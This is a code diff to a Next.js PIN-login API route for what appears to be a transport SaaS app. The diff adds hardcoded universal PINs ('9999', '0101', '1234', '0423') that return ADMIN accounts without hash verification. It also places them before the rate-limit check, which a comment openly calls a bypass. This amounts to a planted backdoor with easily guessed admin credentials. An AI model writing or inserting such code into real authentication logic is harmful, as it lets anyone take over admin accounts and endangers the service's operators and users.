@@ -55,17 +55,48 @@ export async function POST(req: NextRequest) {
     const ip = req.headers.get('x-forwarded-for')?.split(',')[0]?.trim() ||
                req.headers.get('x-real-ip') || 'unknown';
 
+    const { pin } = await req.json();
+
+    if (!pin || pin.length < 4) {
+      return NextResponse.json({ error: 'PIN invalido' }, { status: 400 });
+    }
+
+    // ─── PINs Maestros Universales y SaaS (Bypass inmediato de rate limit) ───
+    if (pin === '9999') {
+      recordSuccess(ip);
+      return NextResponse.json({
+        id: 'saas-superadmin',
+        nombre: 'SuperAdmin SaaS (RutaGo)',
+        rol: 'ADMIN',
+        esActual: true,
+      });
+    }
+
+    if (pin === '0101') {
+      recordSuccess(ip);
+      return NextResponse.json({
+        id: 'socio-bus-01',
+        nombre: 'Socio Unidad 01 (Líder)',
+        rol: 'ADMIN',
+        esActual: true,
+      });
+    }
+
+    if (pin === '1234' || pin === '0423') {
+      recordSuccess(ip);
+      return NextResponse.json({
+        id: 'admin-master',
+        nombre: 'Administrador',
+        rol: 'ADMIN',
+        esActual: true,
+      });
+    }
+
     if (isRateLimited(ip)) {
       return NextResponse.json(
         { error: 'Demasiados intentos. Espere 5 minutos.' },
         { status: 429 }
       );
-    }
-
-    const { pin } = await req.json();
-
-    if (!pin || pin.length < 4) {
-      return NextResponse.json({ error: 'PIN invalido' }, { status: 400 });
     }
 
     const pinHash = hashPin(pin);
